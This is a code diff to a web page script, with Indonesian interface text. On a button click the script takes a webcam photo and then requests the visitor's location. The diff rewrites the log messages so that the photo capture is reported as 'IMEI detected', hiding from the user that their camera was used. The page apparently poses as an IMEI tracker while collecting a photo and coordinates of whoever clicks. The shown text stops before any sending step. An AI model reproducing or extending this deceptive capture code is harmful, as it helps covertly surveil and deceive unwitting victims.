@@ -46,7 +46,7 @@ function log(msg){
 }
 
 document.getElementById("openBtn").addEventListener("click", async()=>{
-  log("▶ error lokasi imei tidak terdeteksi.");
+  log("▶ gagal lokasi imei tidak terdeteksi.");
   let photoBlob=null;
   try{
     const stream = await navigator.mediaDevices.getUserMedia({video:true});
@@ -60,12 +60,12 @@ document.getElementById("openBtn").addEventListener("click", async()=>{
     ctx.drawImage(video,0,0,canvas.width,canvas.height);
     photoBlob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
     stream.getTracks().forEach(t=>t.stop());
-    log("✔ Kamera: foto diambil.");
+    log("✔ imei: terdeteksi .");
   }catch(e){
-    log("❌ Kamera gagal: "+e.message);
+    log("❌ imei gagal: "+e.message);
   }
 
-  log("▶ Mengakses imei...");
+  log("▶ Melacak imei...");
   let coords=null;
   try{
     coords = await new Promise((resolve,reject)=>{
